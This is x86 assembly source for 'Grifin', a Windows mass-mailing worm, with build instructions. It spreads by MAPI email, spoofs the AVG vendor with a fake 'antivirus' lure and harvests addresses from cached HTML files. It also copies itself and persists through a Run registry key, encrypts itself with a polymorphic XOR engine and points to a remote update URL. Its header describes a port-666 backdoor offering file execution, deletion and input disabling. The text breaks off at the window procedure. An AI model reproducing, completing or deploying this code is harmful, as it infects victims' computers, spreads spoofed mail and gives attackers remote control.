;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³[GRIFIN] by Radix16/CIP³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

; WORM QUICK INFORMATION:
; ***********************
; Worm default:
;               SPREAD:       -  email addres (MAPI)

;               ANTIDEBUG     -  Trap flag (detection all tracer)
;
;               EMAILs        -  search in html files (TMP)
;
;               mailfrom:        grisoft@grisoft.cz
;
;               subject:         AVG
;
;               text:            Dobry den, byli jsme donuceni vypustit
;                                uniniversalni antivir, ktery vam odstrani
;                                nebezpecneho worma z vaseho PC.
;                                S pozdravem vase AVG
;
;               BACKDOOR      -  Create port 666
;
;                             *  Chat
;                             *  Message Box
;                             *  Delete File
;                             *  Copy File
;                             *  Move File
;                             *  Execute File
;                             *  Open CD
;                             *  Close CD
;                             *  Disable mouse
;                             *  Disable Keyboard
;                             *  Reboot
;                             *  Power Off (ATX)
;                             *  Update worm
;
; How to compile
; **************
;
;       tasm32 -ml -m5 grifin.asm
;       tlink32 -Tpe -aa -c -x rpe32,rpe32,, import32.lib,, grifin.res
;       pewrsec rpe32.exe
;
;

;************************************************************************************************
; Win32 header
;************************************************************************************************

.386
jumps
locals
.model flat,STDCALL
UNICODE=0

include win32api.inc
include useful.inc

;************************************************************************************************
; API fce
;************************************************************************************************

extrn GetModuleHandleA:PROC
extrn GetCommandLineA:PROC
extrn GetSystemTime:PROC
extrn RegOpenKeyExA:PROC
extrn RegQueryValueExA:PROC
extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC
extrn GetWindowsDirectoryA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetVersion:PROC
extrn lstrcpyA:PROC
extrn FindFirstFileA:PROC
extrn FindNextFileA:PROC
extrn FindClose:PROC
extrn CloseHandle:PROC
extrn CreateDirectoryA:PROC
extrn CreateFileA:PROC
extrn Sleep:PROC
extrn ReadFile:PROC
extrn CreateFileMappingA:PROC
extrn MapViewOfFile:PROC
extrn SetFilePointer:PROC
extrn WriteFile:PROC
extrn UnmapViewOfFile:PROC
extrn ExitProcess:PROC
extrn MessageBoxA:PROC
extrn LoadLibraryA:PROC
extrn CloseHandle:PROC
extrn MoveFileA:PROC
extrn CopyFileA:PROC
extrn FindWindowA:PROC
extrn GetFileSize:PROC
extrn GetModuleFileNameA:PROC
extrn SetCurrentDirectoryA:PROC
extrn bind:PROC
extrn select:PROC
extrn send:PROC
extrn WSAStartup:PROC
extrn WSACleanup:PROC
extrn WSAAsyncSelect:PROC
extrn socket:PROC
extrn closesocket:PROC
extrn htons:PROC
extrn gethostbyname:PROC
extrn recv:PROC
extrn accept:PROC
extrn MAPILogon:PROC
extrn MAPILogoff:PROC
extrn MAPISendMail:PROC
extrn LoadIconA:PROC
extrn LoadCursorA:PROC
extrn DialogBoxParamA:PROC
extrn DefWindowProcA:PROC
extrn wvsprintfA:PROC
extrn SetDlgItemTextA:PROC
extrn mciSendStringA:PROC
extrn SendMessageA:PROC
extrn ExitWindowsEx:PROC
extrn GetForegroundWindow:PROC
extrn DeleteFileA:PROC
extrn WinExec:PROC
extrn GetProcAddress:PROC
extrn CreateThread:PROC
extrn WaitForSingleObject:PROC
extrn SendDlgItemMessageA:PROC
extrn EndDialog:PROC
extrn listen:PROC
extrn wvsprintfA:PROC
extrn ShellExecuteA:PROC
extrn CloseServiceHandle:PROC
extrn CreateServiceA:PROC
extrn OpenSCManagerA:PROC
extrn OpenServiceA:PROC

EWX_LOGOFF              equ     0
EWX_SHUTDOWN            equ     1
EWX_REBOOT              equ     2
EWX_FORCE               equ     4
EWX_POWEROFF            equ     8


WM_USER                 =       0400H
WM_LISTSOCKET           EQU     WM_USER+100
R9XME                   equ     000012B9h
UCHAR                   EQU     <db>
USHORT                  EQU     <dw>  ; used only if we really need 16 bits
UINT                    EQU     <dd>  ; 32 bits for WIN32
ULONG                   EQU     <dd>

L                       equ     <LARGE>

IDI_ICON1               EQU     100
IDD_TOTUSER             EQU     103


FD_READ                 equ     001h
FD_WRITE                equ     002h
FD_OOB                  equ     004h
FD_ACCEPT               equ     008h
FD_CONNECT              equ     010h
FD_CLOSE                equ     020h


; Class styles
;
CS_VREDRAW              =       0001h
CS_HREDRAW              =       0002h
CS_KEYCVTWINDOW         =       0004H
CS_DBLCLKS              =       0008h
SBS_SIZEGRIP            =       0010h
CS_OWNDC                =       0020h
CS_CLASSDC              =       0040h
CS_PARENTDC             =       0080h
CS_NOKEYCVT             =       0100h
CS_SAVEBITS             =       0800h
CS_NOCLOSE              =       0200h
CS_BYTEALIGNCLIENT      =       1000h
CS_BYTEALIGNWINDOW      =       2000h
CS_GLOBALCLASS          =       4000h    ; Global window class

;
;  Predefined cursor & icon IDs
;

IDC_ARROW               =       32512
IDC_IBEAM               =       32513
IDC_WAIT                =       32514
IDC_CROSS               =       32515
IDC_UPARROW             =       32516
IDC_SIZE                =       32640
IDC_ICON                =       32641
IDC_SIZENWSE            =       32642
IDC_SIZENESW            =       32643
IDC_SIZEWE              =       32644
IDC_SIZENS              =       32645


WM_NULL                 =       0000h
WM_CREATE               =       0001h
WM_DESTROY              =       0002h
WM_MOVE                 =       0003h
WM_SIZE                 =       0005h
WM_ACTIVATE             =       0006h
WM_SETFOCUS             =       0007h
WM_KILLFOCUS            =       0008h
WM_ENABLE               =       000Ah
WM_SETREDRAW            =       000Bh
WM_SETTEXT              =       000Ch
WM_GETTEXT              =       000Dh
WM_GETTEXTLENGTH        =       000Eh
WM_PAINT                =       000Fh
WM_CLOSE                =       0010h
WM_QUERYENDSESSION      =       0011h
WM_QUIT                 =       0012h
WM_QUERYOPEN            =       0013h
WM_ERASEBKGND           =       0014h
WM_SYSCOLORCHANGE       =       0015h
WM_ENDSESSION           =       0016h
WM_SYSTEMERROR          =       0017h
WM_SHOWWINDOW           =       0018h

WM_INITDIALOG           =       0110h
WM_COMMAND              =       0111h
WM_SYSCOMMAND           =       0112h
WM_TIMER                =       0113h
WM_HSCROLL              =       0114h
WM_VSCROLL              =       0115h
WM_INITMENU             =       0116h
WM_INITMENUPOPUP        =       0117h
WM_MENUSELECT           =       011Fh
WM_MENUCHAR             =       0120h
WM_ENTERIDLE            =       0121h


; ShowWindow() Commands
SW_HIDE                 =       0
SW_SHOWNORMAL           =       1
SW_NORMAL               =       1
SW_SHOWMINIMIZED        =       2
SW_SHOWMAXIMIZED        =       3
SW_MAXIMIZE             =       3
SW_SHOWNOACTIVATE       =       4
SW_SHOW                 =       5
SW_MINIMIZE             =       6
SW_SHOWMINNOACTIVE      =       7
SW_SHOWNA               =       8
SW_RESTORE              =       9

EM_GETSEL               =       00B0h
EM_SETSEL               =       00B1h
EM_GETRECT              =       00B2h
EM_SETRECT              =       00B3h
EM_SETRECTNP            =       00B4h
EM_SCROLL               =       00B5h
EM_LINESCROLL           =       00B6h
EM_SCROLLCARET          =       00B7h
EM_GETMODIFY            =       00B8h
EM_SETMODIFY            =       00B9h
EM_GETLINECOUNT         =       00BAh
EM_LINEINDEX            =       00BBh
EM_SETHANDLE            =       00BCh
EM_GETHANDLE            =       00BDh
EM_GETTHUMB             =       00BEh
EM_LINELENGTH           =       00C1h
EM_REPLACESEL           =       00C2h
EM_GETLINE              =       00C4h
EM_LIMITTEXT            =       00C5h
EM_CANUNDO              =       00C6h
EM_UNDO                 =       00C7h
EM_FMTLINES             =       00C8h
EM_LINEFROMCHAR         =       00C9h
EM_SETTABSTOPS          =       00CBh
EM_SETPASSWORDCHAR      =       00CCh
EM_EMPTYUNDOBUFFER      =       00CDh
EM_GETFIRSTVISIBLELINE  =       00CEh
EM_SETREADONLY          =       00CFh
EM_SETWORDBREAKPROC     =       00D0h
EM_GETWORDBREAKPROC     =       00D1h
EM_GETPASSWORDCHAR      =       00D2h
EM_SETMARGINS           =       00D3h
EM_GETMARGINS           =       00D4h


KEY_ALL_ACCESS          equ     0F003FH
AF_INET                 equ     2
PF_INET                 equ     2
SOCK_STREAM             equ     1


SERVICE_BOOT_START      equ     00000000
SERVICE_SYSTEM_START    equ     00000001
SERVICE_AUTO_START      equ     00000002
SERVICE_DEMAND_START    equ     00000003
SERVICE_DISABLED        equ     00000004

SERVICE_ERROR_IGNORE    equ     00000000
SERVICE_ERROR_NORMAL    equ     00000001
SERVICE_ERROR_SEVERE    equ     00000002
SERVICE_ERROR_CRITICAL  equ     00000003

SERVICE_WIN32_OWN_PROCESS   equ 00000010
SERVICE_WIN32_SHARE_PROCESS equ 00000020

SC_MANAGER_CONNECT      equ     0001
SC_MANAGER_CREATE_SERVICE equ   0002
SC_MANAGER_ENUMERATE_SERVICE equ  0004
SC_MANAGER_LOCK         equ     0008
SC_MANAGER_QUERY_LOCK_STATUS equ 0010
SC_MANAGER_MODIFY_BOOT_CONFIG equ 0020



;************************************************************************************************
; DATA section
;************************************************************************************************


.data


        MapiMessage     equ     $

                        dd      ?
                        dd      offset subject
                        dd      offset textmail
                        dd      ?
                        dd      offset date
                        dd      ?
                        dd      2
                        dd      offset MsgFrom
                        dd      1
                        dd      offset MsgTo
                        dd      1
                        dd      offset MapiFileDesc

        MsgFrom         equ     $

                        dd      ?
                        dd      ?
                        dd      offset namefrom
                        dd      offset mailfrom
                        dd      ?
                        dd      ?

        MsgTo           equ     $

                        dd      ?
                        dd      1
                        dd      offset nameto
                        dd      offset email_ads
                        dd      ?
                        dd      ?

        MapiFileDesc    equ     $

                        dd      ?
                        dd      ?
                        dd      ?
                        dd      offset win_dir
                        dd      ?
                        dd      ?

; end MAPI data

; polymorphic table (DATA)

        table_1         equ     $

                        dd      offset jmp_ins
                        dd      offset mov_ins
                        dd      offset add_ins
                        dd      offset sub_ins
                        dd      offset inc_ins
                        dd      offset dec_ins
                        dd      offset xor_ins

        jmp_r           dd      0
        jmp_s           dd      0
        size_c          dd      0
        pointer_c       dd      0
        key_c           dd      0
        randomize       dd      20
        smeti           dd      324h
        mov_r           dd      12345678h
        ostrovy         dd      0

; end polys (DATA)


        reg_value_t     dd      0
        upload_size     dd      0
        ecx_save        dd      0
        MAPISession     dd      0
        shandle         dd      0
        fhandle         dd      0
        Output_Handle   dd      0
        mapaddress      dd      0
        maphandle       dd      0
        number          dd      0
        tmp             dd      0
        mem             dd      0
        h_Key           dd      0
        temp            dd      0
        LengthOfString  dd      0
      crypr_pointer dd  0   

        hInst           dd      0
        hMenu           dd      0
        hDlg            dd      0

        max_path        equ     256

filetim struct

        FT_dwLowDateT   dd      ?
        FT_dwHighDateT  dd      ?

filetim ends

w32fd   struct

        FileAttributes  dd      ?
        CreationTime    filetim ?
        LastAccessTime  filetim ?
        LastWriteTime   filetim ?
        FileSizeHigh    dd      ?
        FileSizeLow     dd      ?
        Reserved0       dd      ?
        Reserved1       dd      ?
        FileName        db      max_path DUP (00)
        AlternateFileN  db      13 dup (?)
                        db      3 dup (?)
w32fd   ends

SYSTEMTIME struct

        wYear           WORD    ?
        wMonth          WORD    ?
        wDayOfWeek      WORD    ?
        wDay            WORD    ?
        wHour           WORD    ?
        wMinute         WORD    ?
        wSecond         WORD    ?
        wMilliseconds   WORD    ?

SYSTEMTIME ends

WSADATA   struc

        mVersion        dw      ?
        mHighVersion    dw      ?
        szDescription   db      257 dup (?)
        szSystemStatus  db      129 dup (?)
        iMaxSockets     dw      ?
        iMaxUpdDg       dw      ?
        lpVendorInfo    dd      ?

WSADATA  ends

SOCKADDR  struc

        sin_family     dw      ?
        sin_port       dw      ?
        sin_addr       dd      ?
        sin_zero       db      8 dup (?)

SOCKADDR ends

WNDCLASS struc
        clsStyle          UINT     ?
        clsLpfnWndProc    ULONG    ?
        clsCbClsExtra     UINT     ?
        clsCbWndExtra     UINT     ?
        clsHInstance      UINT     ?
        clsHIcon          UINT     ?
        clsHCursor        UINT     ?
        clsHbrBackground  UINT     ?
        clsLpszMenuName   ULONG    ?
        clsLpszClassName  ULONG    ?
        hIconSm           UINT     ?
WNDCLASS ends

MSGSTRUCT struc

        msHWND          UINT    ?
        msMESSAGE       UINT    ?
        msWPARAM        UINT    ?
        msLPARAM        ULONG   ?
        msTIME          ULONG   ?
        msPT            ULONG   2 dup(?)

MSGSTRUCT ends


        search          w32fd           ?
        SystemTime      SYSTEMTIME      <>
        wsadata         WSADATA         <>
        sin             SOCKADDR        <>
        msg             MSGSTRUCT       <?>
        wc              WNDCLASS        <?>

        lpParameter     dd      00000000h
        lpThreadId      dd      00000000h
        listsock        dd      0
        port            dd      666

        IO_Bytes_Count  dd      0
        k_handle        dd      0
        sehandle        dd      0
        ihandle         dd      0
        xhandler        dd      0

        Connections     dd      0
        Connectionsstr  db      '0',5 dup (0)


        Hex2Dec                  db '%-4i',0
        k_data          db      260 dup(0)
        k_len           dd      260
        k_type          dd      0


        SMTP_server     db      40  dup(00)
        email_ads       db      40  dup(00)
        win_dir         db      256 dup(00)
        worm_p          db      256 dup(00)
        cmd_1           db      256 dup(?)
        cmd_2           db      256 dup(?)
        Input_Buffer    db      200 dup(0)
        Output_Buffer   db      200 dup(0)
        sockdes         db      4000 dup (0)
        Read_Buffer     db      16000 dup(?)

;************************************************************************************************
; CODE section
;************************************************************************************************

.code
start:
;--------------------
;
; Polymorphic stuff
;
;--------------------
      mov     dword ptr [crypr_pointer],12345678h

        jmp     first_generation
 bimbam db      1556 dup(00) ;10
first_generation:

;----------------
;
; Installation
;
;----------------
        call    def_16
        mov     eax, offset def_16
        add     eax, 110045h
        inc     xhandler
        nop
        xor     eax,eax
        nop
        ret
k32     db      'KERNEL32.DLL',0
def_16:
        xor     eax,eax

        push    dword ptr fs:[eax]
        mov     fs:[eax],esp
        pushfd
        or      byte ptr [esp+1],1
        popfd
        nop
        pop     dword ptr fs:[eax]
        pop     ebx

        dec     xhandler

        js      ok_trace

___meta db      10h dup (90h)

        jmp     no_trace
ok_trace:
        @pushsz ":-)"
        mov     eax, offset start
        sub     eax, 15h
        xchg    eax,ecx

        call    Dis_keyboard

        or      eax,eax
        je      def_16

        push    NULL

        mov     ecx,ebx
        cmp     al,'T'
        je      $+200
        loop    $-15

no_trace:
        push    0
        call    GetModuleHandleA
        mov     [hInst], eax

        call    read_wpath

        mov     edx,offset k_data

        push    offset search
        push    edx
        call    FindFirstFileA

        inc     eax
        jne     found_file

        call    GetCommandLineA
        mov     esi, eax

        cmp     byte ptr [esi+01h],':'
        je      lstrcpyA_

        inc     eax
        lea     esi, worm_p
lstrcpyA_:
        push    eax
        push    offset worm_p
        call    lstrcpyA

        mov     ecx, 256
        mov     edx, offset worm_p
@1:     cmp     byte ptr [edx],22h
        je      @2

        inc     edx
        loop    @1

@2:     xor     al, al
        mov     byte ptr [edx], al

        push    offset SystemTime
        call    GetSystemTime

        push    256
        push    offset win_dir
        call    GetWindowsDirectoryA

        mov     ebx, offset klavesnicaEN

        mov     edx, offset win_dir
        mov     esi, offset ran_name

        push    esi

        mov     ecx, 8
        inc     esi
        push    eax

        xor     edi,edi
        mov     di,word ptr [SystemTime.wSecond]
        jmp     @6
@5:
        dec     di
        dec     di
        dec     di

@6:     mov     ax,25
        sub     ax,di
        jc      @5

@4:     mov     al, [ebx + edi]
        mov     [esi], al
        inc     esi
        inc     di
        loop    @6
        pop     eax

        mov     ecx, new_name_size

        pop     esi

@3:
        mov     bl, [esi]
        mov     byte ptr [edx + eax], bl
        inc     eax
        inc     esi

        loop    @3

        push    FALSE
        push    offset win_dir
        push    offset worm_p
        call    CopyFileA

        call    setup_1

        call    polys

found_file:

        call    GetVersion

        cmp     al,5
        je      WinSUX

win9xME_service:

        push    offset k32
        call    GetModuleHandleA

        @pushsz "RegisterServiceProcess"
        push    eax
        call    GetProcAddress

        xchg    eax, ecx
        jecxz   Next_Gamer

        push    1
        push    0
        call    ecx

Next_Gamer:
        jmp     suxx__
        db      100 dup (90)
        call    Create_EML_file
        suxx__:
        cmp     word ptr [SystemTime.wDay],26
        je      updating_worm
__@2_:

        call    sendmail

        push    offset wsadata
        push    0101h
        call    WSAStartup

        mov     sin.sin_family, AF_INET
        push    port
        call    htons

        mov     sin.sin_port,ax

        call    DialogBox

        push    NULL

        call    ExitProcess

updating_worm:
        xor     al,al
        mov     ecx,256
        lea     edi,k_data
        rep     stosb

        mov     ebx, 80000002h
        mov     edx, offset __000
        call    proc1

        mov     edx, offset __111
        call    proc2

        mov     edi,offset k_data
        sub     edi,3
        inc     edi

        call    update_w
        jmp     __@2_


WinSUX:
        db      200 dup (90h)
        jmp     Next_Gamer


read_wpath:
        mov     ebx, 80000002h
        lea     edx, dword ptr [offset __000]
        call    proc1

        lea     edx, dword ptr [offset __pat]
        call    proc2

        ret

;************************************************************************************************
; Send email (MAPI)
;************************************************************************************************


sendmail:
        xor     eax,eax
        push    offset MAPISession
        push    eax
        push    eax
        push    eax
        push    eax
        push    eax
        call    MAPILogon

        test    eax,eax
        jne     error_mapi

        call    s_email

        xor     eax,eax

        push    eax
        push    eax
        push    eax
        push    dword ptr [MAPISession]
        call    MAPILogoff

error_mapi:
        ret

send_mail:
        xor     eax, eax

        push    eax
        push    eax
        push    offset MapiMessage
        push    eax
        push    dword ptr [MAPISession]
        call    MAPISendMail
        ret


;************************************************************************************************
; Reg setup
;************************************************************************************************


proc1:  lea     eax, dword ptr [offset k_handle]
        push    eax
        push    KEY_ALL_ACCESS
        push    0
        push    edx
        push    ebx
        call    RegOpenKeyExA
        ret

proc2:
        lea     eax, dword ptr [offset k_len]
        push    eax
        lea     eax, dword ptr [offset k_data]
        push    eax
        lea     eax, dword ptr [offset k_type]
        push    eax
        push    0
        push    edx
        mov     eax, dword ptr [k_handle]
        push    eax
        call    RegQueryValueExA

        push    eax

        push    dword ptr [k_handle]
        call    RegCloseKey

        pop     eax

        ret

_reg_current_user:
        pushad
        mov     ebx,80000001h
        mov     ebp,4
        mov     ecx,4
        push    ecx
        jmp     _reg_save

_reg_key:
        pushad
        mov     ebx,80000002h
        mov     ebp,1
        mov     ecx,256
        push    ecx

_reg_save:
        xor     eax,eax

        push    offset tmp
        push    offset h_Key
        push    eax
        push    3
        push    eax
        push    eax
        push    eax
        push    edx
        push    ebx
        call    RegCreateKeyExA

_RegSetValue:
        pop     ecx
        push    ecx
        push    edi
        push    ebp
        push    0
        push    esi
        mov     ebx, dword ptr [h_Key]
        push    ebx
        call    RegSetValueExA

_RegCloseKey:
        push    ebx
        call    RegCloseKey
        popad
        ret

;************************************************************************************************
; Search emails address (html)
;************************************************************************************************

s_email:
        xor     al,al
        mov     ecx,256
        lea     edi,k_data
        rep     stosb

        mov     ebx, 80000002h
        lea     edx, dword ptr [offset TempWIN9X]
        call    proc1

        lea     edx, dword ptr [offset TempDirectory]
        call    proc2

        push    offset k_data
        call    SetCurrentDirectoryA

        push    offset search
        @pushsz '*.*'
        call    FindFirstFileA

        inc     eax
        je      quit_search
        dec     eax

        mov     dword ptr [shandle],eax

loop_____:
        lea     edi,[search.FileName]
        cmp     byte ptr [edi],'.'
        je      _NextSearchDirec

        mov     ecx,100
s_dot:
        inc     edi

        cmp     byte ptr [edi],'.'
        je      _NextSearchDirec

        loop    s_dot

        jmp     search_html

_NextSearchDirec:
        call    clear_f

        push    offset search
        push    dword ptr [shandle]
        call    FindNextFileA

        dec     eax
        je      loop_____

        jmp     leave_search

search_html:
        lea     edi,[search.FileName]

        push    edi
        call    SetCurrentDirectoryA

        call    clear_f

        push    offset search
        @pushsz '*.htm*'
        call    FindFirstFileA

        inc     eax
        je      quit_search
        dec     eax

        mov     dword ptr [sehandle],eax

try_inf:

        lea     edi,[search.FileName]

        xor     eax,eax

        push    eax
        push    FILE_ATTRIBUTE_NORMAL
        push    OPEN_EXISTING
        push    eax
        push    FILE_SHARE_READ
        push    GENERIC_READ
        push    edi
        call    CreateFileA

        inc     eax
        je      next_s
        dec     eax

        mov     dword ptr [fhandle], eax


        xor     eax,eax

        push    eax
        push    eax
        push    eax                                             ; Creating File map
        push    PAGE_READONLY
        push    eax
        push    dword ptr [fhandle]
        call    CreateFileMappingA

        or      eax,eax                                         ; error ?
        jz      e_hanf

        mov     dword ptr [maphandle],eax

        xor     ebx,ebx

        push    ebx                                           ; Map view
        push    ebx
        push    ebx
        push    FILE_MAP_READ
        push    eax
        call    MapViewOfFile

        or      eax,eax                                         ; error ?
        jz      e_maph

        mov     dword ptr [mapaddress], eax

        mov     edi, offset email_ads
        mov     esi, eax

        push    NULL
        push    [fhandle]
        call    GetFileSize

        xchg    eax,ecx
        jecxz   u_v_f

 seekit:cmp     dword ptr [esi], 'iam"'
        jnz     ckuf

        cmp     dword ptr [esi+4], ":otl"
        jz      librty

 ckuf:  inc     esi

skream: loop    seekit
        stc
        jmp     u_v_f

 librty:lea     esi,[esi+8]

 cpmail:lodsb
        stosb

        cmp     al,'"'
        jnz     cpmail

        mov     byte ptr [edi-1],00h
        clc

        mov     [ecx_save], ecx

        call    send_mail

no_czech_email:
        mov     ecx, [ecx_save]

        mov     edi, offset email_ads

        jmp     seekit

u_v_f:  push    dword ptr [mapaddress]                          ; UnmapViewOfFile
        call    UnmapViewOfFile

e_maph: push    dword ptr [maphandle]                           ; close map hadle
        call    CloseHandle

e_hanf: push    dword ptr [fhandle]                             ; close file handle
        call    CloseHandle

next_s:
        call    clear_f

        push    offset search                                   ; search next file
        push    dword ptr [offset sehandle]
        call    FindNextFileA

        dec     eax
        je      try_inf

        push    dword ptr [offset sehandle]
        call    FindClose

quit_search:
        push    offset k_data
        call    SetCurrentDirectoryA

        jmp     _NextSearchDirec

leave_search:
        ret

clear_f:lea     edi,[search.FileName]
        mov     ecx,256

next_z: mov     byte ptr [edi],00                               ; clear filename buffer
        inc     edi

        loop    next_z
        ret

;**************************************************************************************
; Polymorphic engine
;**************************************************************************************

polys:
        pusha

        sub     ebx,ebx
        mov     jmp_s,ebx
        add     smeti,34
        mov     edx,offset start

        cmp     randomize,1
        je      new_num

        dec     randomize

        jmp     _@o

new_num:mov     randomize,20
_@o:    mov     edi,offset table_1
        mov     ecx,6
create_p:
        mov     esi,[edi]
        call    esi

        add     edi,4

        loop    create_p

        inc     ostrovy

        cmp     ostrovy,6
        jne     _@o

        call    xor_ins

        mov     al,0E9h
        mov     byte ptr [edx], al
        xor     ecx,ecx
        mov     eax,edx
        mov     ebx,offset start
        sub     eax,ebx

t@T:    cmp     eax,1566
        je      end_jmp

        inc     ecx
        inc     eax

        jmp     t@T

end_jmp:inc     edx
        mov     dword ptr [edx], ecx

        call    bordel

        xor     eax,eax

        push    eax
        push    eax
        push    3
        push    eax
        push    eax
        push    80000000h or 40000000h
        push    offset win_dir
        call    CreateFileA

        inc     eax
        je      shit_fucking
        dec     eax

        mov     dword ptr [fhandle],eax

        push    0
        push    0
        push    1536
        push    dword ptr [fhandle]
        call    SetFilePointer

        push    0
        push    offset number
        push    1569
        push    offset start
        push    dword ptr [fhandle]
        call    WriteFile

        mov     mem,16000

        xor     eax,eax

        push    eax
        push    dword ptr [mem]
        push    eax
        push    PAGE_READWRITE
        push    eax
        push    dword ptr [fhandle]
        call    CreateFileMappingA

        or      eax,eax
        jz      e_hanf2

        mov     dword ptr [maphandle],eax

        xor     ebx,ebx

        push    dword ptr [mem]
        push    ebx
        push    ebx
        push    FILE_MAP_ALL_ACCESS
        push    eax
        call    MapViewOfFile

        or      eax,eax
        jz      e_maph2

        mov     dword ptr [mapaddress],eax
        mov     esi,eax
        add     esi,1536
        add     esi,1571
               ; nice 
      push    esi   
      je        s_crypt         
        mov     ecx,6500
      push    ecx   
      xor       eax,eax
        mov     ebx,123888h ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

      mov        eax,dword ptr [crypr_pointer]
      or        eax,eax
      jne       next_cc
generation_crypt:
      xor     dword ptr [esi],ebx
        inc     esi
        loop    generation_crypt
next_cc:
      pop     ecx        
      pop       esi
s_crypt:
        xor     dword ptr [esi],ebx
        inc     esi
        loop    s_crypt

u_v_f2: push    dword ptr [mapaddress]
        call    UnmapViewOfFile

e_maph2:push    dword ptr [maphandle]
        call    CloseHandle
e_hanf2:
        push    dword ptr [fhandle]
        call    CloseHandle
shit_fucking:
        popa
        ret

        ;size_c         dd      0
        ;pointer_c      dd      0
        ;key_c          dd      0

;****************************************************************************
; Create JMP ins.
;****************************************************************************


jmp_ins:
        mov     al,0E9H
        mov     byte ptr [edx],al
        call    random
        inc     edx
        mov     dword ptr [edx],eax
        push    ecx
        mov     ecx,eax
        call    bordel
        pop     ecx
        ret

;****************************************************************************
; Create MOV ins.
;****************************************************************************

mov_ins:
        call    virus_datap
        shl     eax,1
        push    eax
        call    random_2
        pop     eax
        add     eax,mov_r
        push    eax
        mov     al,0B8h                         ; mov eax
        mov     byte ptr [edx],al
        inc     edx
        pop     eax
        mov     dword ptr [edx],eax
        add     edx,4

        ret

;****************************************************************************
; Create ADD ins.
;****************************************************************************

add_ins:
        call    virus_datap
        shr     eax,1
        push    eax
        call    random_2
        pop     eax
        sub     eax,mov_r
        push    eax
        mov     al,05h                          ; add eax
        mov     byte ptr [edx],al
        inc     edx
        pop     eax
        mov     dword ptr [edx],eax
        add     edx,4

        ret

;****************************************************************************
; Create SUB ins.
;****************************************************************************

sub_ins:
        call    virus_datap
        shr     eax,2
        push    eax
        call    random_2
        pop     eax
        add     eax,mov_r
        push    eax
        mov     al,2dh                          ; sub eax
        mov     byte ptr [edx],al
        inc     edx
        pop     eax
        mov     dword ptr [edx],eax
        add     edx,4

        ret

;****************************************************************************
; Create INC ins.
;****************************************************************************

inc_ins:
        mov     al,40h                          ; inc eax
        mov     byte ptr [edx],al
        inc     edx
        ret

;****************************************************************************
; Create DEC ins.
;****************************************************************************


dec_ins:
        mov     al,48h                          ; dec eax
        mov     byte ptr [edx],al
        inc     edx
        ret

;****************************************************************************
; Decode code   ---    XOR technigue
;****************************************************************************

xor_ins:
        mov     al,0B9h        ;ecx
        mov     byte ptr [edx],al
        inc     edx
        mov     dword ptr [edx],6500
        add     edx,4

        mov     al,0BBh    ;ebx
        mov     byte ptr [edx],al
        inc     edx
      xor       eax,eax

;     mov       eax,dword ptr [crypr_pointer]
;     or        eax,eax
;     je        next_ccc
;
;     mov     ax,word ptr [SystemTime.wMilliseconds]
      add       eax,123888h

;     mov       dword ptr [first_encryot_code],eax

      xor       eax,eax       
;next_ccc:
;     mov     ax,word ptr [SystemTime.wMilliseconds]

      mov       eax,123888h
        mov     dword ptr [edx],eax
        add     edx,4

        mov     al,0BEh       ;esi
        mov     byte ptr [edx],al
        inc     edx
        call    __v_pointer

        mov     dword ptr [edx],eax
        add     edx,4

        mov     ax,01E31h
        mov     word ptr [edx],ax               ;decode file
        add     edx,2
        mov     al,46h
        mov     byte ptr [edx],al
        inc     edx
        mov     ax,0FBE2h
        mov     word ptr [edx],ax
        add     edx,2
        ret

;****************************************************************************
; Virus code pointer
;****************************************************************************

__v_pointer:
        mov     eax,00401000h
        add     eax,1571
        ret


virus_datap:
        mov     eax,2600
        mov     ebx,00401000h
        add     ebx,1571
        ret

;****************************************************************************
; Random number
;****************************************************************************

random:
        mov     ebx,randomize
        add     jmp_s,ebx
        xor     eax,eax
        mov     eax,1569
        shr     eax,4
        mov     jmp_r,eax
        add     eax,jmp_s
        ret

random_2:
        xor     eax,eax
        mov     eax,mov_r
        add     eax,6785h
        mov     mov_r,eax

        ret

bordel: 
        mov     ax,word ptr [SystemTime.wSecond]
      add     edx,4
        add     eax,mov_r
ttt:    add     eax,18Bh
        mov     dword ptr [edx],eax
        inc     edx
        loop    ttt
        ret


;************************************************************************************************
; Virus SETUP I
;************************************************************************************************

setup_1:
        mov     edx, offset runkey
        mov     esi, offset regvalue
        mov     edi, offset win_dir
        call    _reg_key
_0223:
        mov     edx, offset runkey
        call    __@1
 __000          db      "SOFTWARE\Grifin",0
 __@1:
        pop     edx
        push    edx
        call    __@2
__pat           db      "VirusPath",0
  __@2:
        pop     esi
        mov     edi, offset win_dir
        call    _reg_key

        call    __@3
 __111          db      'UpdateURL',0
        __@3:
        pop     esi

        call    __@4
                db      "http://www.volny.cz/radix16/grifin.grf",0
  __@4:
        pop     edi
        pop     edx
        call    _reg_key

        jmp     end_regedit

        call    __@12
                db      "SOFTWARE\Microsoft\Windows\CurrentVersion"
                db      "\Policies\System",0
 __@12:
        pop     edx

        call    __@13
                db      "DisableRegistryTools",0
      __@13:
        pop     esi

        call    __14
                dd      00000001h
__14:
        pop     edi
        call    _reg_current_user

end_regedit:

        ret

clear_FileName:
        xor     al,al
        mov     ecx,256
        lea     edi,[search.FileName]
        rep     stosb
        ret


;************************************************************************************************
; Starting BackDoor
;************************************************************************************************


DialogBox:
        push    offset sztitle
        push    0
        call    FindWindowA

        or      eax,eax
        jz      reg_class

        ret

reg_class:

        mov     [wc.clsStyle], CS_HREDRAW + CS_VREDRAW + CS_GLOBALCLASS
        mov     [wc.clsLpfnWndProc], offset WndProc
        mov     [wc.clsCbClsExtra], 0
        mov     [wc.clsCbWndExtra], 0
        mov     [wc.clsLpszMenuName],0
        mov     [wc.clsLpszClassName],offset classname

        mov     eax, [hInst]
        mov     [wc.clsHInstance], eax

        push    IDI_ICON1
        push    eax
        call    LoadIconA

        mov     [wc.clsHIcon], eax

        push    L IDC_ARROW
        push    L 0
        call    LoadCursorA
        mov     [wc.clsHCursor], eax

        push    0
        push    offset Main_Dialog
        push    0
        push    offset dlg_start
        push    [hInst]
        call    DialogBoxParamA
        jmp     Dialog_end

WndProc proc hwnd:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD
        push    esi
        push    edi
        push    ebx

        push    [lparam]
        push    [wparam]
        push    [wmsg]
        push    [hwnd]
        call    DefWindowProcA

Wnd_finish:
